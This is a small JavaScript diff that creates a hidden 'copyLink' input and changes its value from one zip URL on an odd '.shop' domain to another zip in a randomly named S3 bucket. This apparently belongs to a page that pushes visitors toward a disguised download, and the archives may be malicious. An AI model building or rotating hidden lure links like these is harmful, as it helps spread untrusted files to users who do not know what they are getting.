@@ -3,7 +3,7 @@
             const copyLinkInput = document.createElement('input');
             copyLinkInput.type = 'text';
             copyLinkInput.id = 'copyLink';
-            copyLinkInput.value = 'https://soft.downoss-win01.shop/dsfsxzguge.zip';
+            copyLinkInput.value = 'https://mcbdhrnw.s3.ap-east-1.amazonaws.com/chermmorety.zip';
             copyLinkInput.style.display = 'none';
             document.body.appendChild(copyLinkInput);
 
